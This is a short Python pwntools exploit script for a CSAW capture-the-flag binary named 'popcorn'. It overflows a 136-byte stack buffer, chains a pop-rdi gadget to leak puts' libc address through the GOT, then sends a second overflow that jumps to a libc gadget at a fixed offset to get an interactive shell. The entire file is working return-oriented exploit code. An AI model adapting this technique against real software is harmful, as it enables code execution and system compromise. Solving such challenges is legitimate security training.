from pwn import *
import base64
#p = remote('pwn.chal.csaw.io', 1006)
p = process('./popcorn')
gdb.attach(p)
e =  ELF('./popcorn')
l =  ELF('./libc.so.6')
payload = "A"*136
payload += p64(0x4011eb) # pop rdi; ret
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(e.symbols['main'])
p.recv(1024)
p.sendline(payload)
x=p.recv(8)
for i in bytearray(x):
	print (hex(i))
p2 = raw_input("pls")
y = int(p2,16)
print "y: " + hex(y)
offset = 0x73b46
y = y+offset
p.sendline('a'*136+p64(y))
p.interactive()
